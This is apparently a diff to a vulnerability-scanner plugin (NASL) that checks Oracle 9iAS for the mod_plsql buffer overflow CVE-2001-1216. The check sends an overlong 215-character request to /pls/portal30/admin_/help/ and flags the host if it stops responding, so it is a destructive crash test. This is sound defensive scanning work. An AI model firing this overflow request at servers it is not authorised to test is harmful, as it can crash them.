@@ -22,83 +22,71 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 #
 
-tag_summary = "Oracle 9i Application Server uses Apache as it's web
-server. There is a buffer overflow in the mod_plsql module
-which allows an attacker to run arbitrary code.";
-
-tag_solution = "Oracle have released a patch for this vulnerability, which
-is available from:
-
-http://metalink.oracle.com";
-
-
 if(description)
 {
- script_oid("1.3.6.1.4.1.25623.1.0.10840");
- script_version("$Revision: 9348 $");
- script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
- script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
- script_bugtraq_id(3726);
- script_tag(name:"cvss_base", value:"7.5");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
- script_cve_id("CVE-2001-1216");
- name = "Oracle 9iAS mod_plsql Buffer Overflow";
- 
- script_name(name);
- 
+  script_oid("1.3.6.1.4.1.25623.1.0.10840");
+  script_version("2019-04-10T13:42:28+0000");
+  script_tag(name:"last_modification", value:"2019-04-10 13:42:28 +0000 (Wed, 10 Apr 2019)");
+  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
+  script_bugtraq_id(3726);
+  script_tag(name:"cvss_base", value:"7.5");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
+  script_cve_id("CVE-2001-1216");
+  script_name("Oracle 9iAS mod_plsql Buffer Overflow");
+  script_category(ACT_DESTRUCTIVE_ATTACK);
+  script_copyright("This script is Copyright (C) 2002 Matt Moore");
+  script_family("Web application abuses");
+  script_dependencies("find_service.nasl", "http_version.nasl");
+  script_require_ports("Services/www", 80);
+  script_mandatory_keys("www/OracleApache");
 
- script_xref(name : "URL" , value : "http://www.nextgenss.com/advisories/plsql.txt");
- script_xref(name : "URL" , value : "http://otn.oracle.com/deploy/security/pdf/modplsql.pdf");
+  script_xref(name:"URL", value:"http://www.nextgenss.com/advisories/plsql.txt");
+  script_xref(name:"URL", value:"http://otn.oracle.com/deploy/security/pdf/modplsql.pdf");
 
- 
- script_category(ACT_DESTRUCTIVE_ATTACK);
+  script_tag(name:"solution", value:"Oracle have released a patch for this vulnerability.");
+
+  script_tag(name:"summary", value:"Oracle 9i Application Server uses Apache as it's web
+  server. There is a buffer overflow in the mod_plsql module
+  which allows an attacker to run arbitrary code.");
+
+  script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_vul");
- 
- 
- script_copyright("This script is Copyright (C) 2002 Matt Moore");
- family = "Web application abuses";
- script_family(family);
- script_dependencies("find_service.nasl", "http_version.nasl");
- script_require_ports("Services/www", 80);
- script_require_keys("www/OracleApache");
- script_tag(name : "solution" , value : tag_solution);
- script_tag(name : "summary" , value : tag_summary);
- exit(0);
-}
 
-#
-# The script code starts here
-# 
+  exit(0);
+}
 
 include("http_func.inc");
 
 port = get_http_port(default:80);
 
+if(http_is_dead(port:port))
+  exit(0);
 
-if(get_port_state(port))
-{
- if(http_is_dead(port:port))exit(0);
- soc = http_open_socket(port);
- if(soc)
- {
+soc = http_open_socket(port);
+if(!soc)
+  exit(0);
+
 # Send 215 chars at the end of the URL
-  buf = http_get(item:string("/XXX/XXXXXXXX/XXXXXXX/XXXX/", crap(215)), port:port);
-  send(socket:soc, data:buf);
-  recv = http_recv(socket:soc);
-  if ( ! recv ) exit(0);
-  close(soc);
+buf = http_get(item:string("/XXX/XXXXXXXX/XXXXXXX/XXXX/", crap(215)), port:port);
+send(socket:soc, data:buf);
+recv = http_recv(socket:soc);
+close(soc);
 
-  soc = http_open_socket(port);
-  if ( ! soc ) exit(0);
-  
-  buf = http_get(item:string("/pls/portal30/admin_/help/", crap(215)), port:port);
-  send(socket:soc, data:buf);
- 
- unbreakable = http_recv(socket:soc);
- if(!unbreakable)
-	security_message(port);
-  
-  } else {
-   http_close_socket(soc);
-  }
- }
+if(!recv)
+  exit(0);
+
+soc = http_open_socket(port);
+if(!soc)
+  exit(0);
+
+buf = http_get(item:string("/pls/portal30/admin_/help/", crap(215)), port:port);
+send(socket:soc, data:buf);
+unbreakable = http_recv(socket:soc);
+http_close_socket(soc);
+
+if(!unbreakable) {
+  security_message(port:port);
+  exit(0);
+}
+
+exit(99);
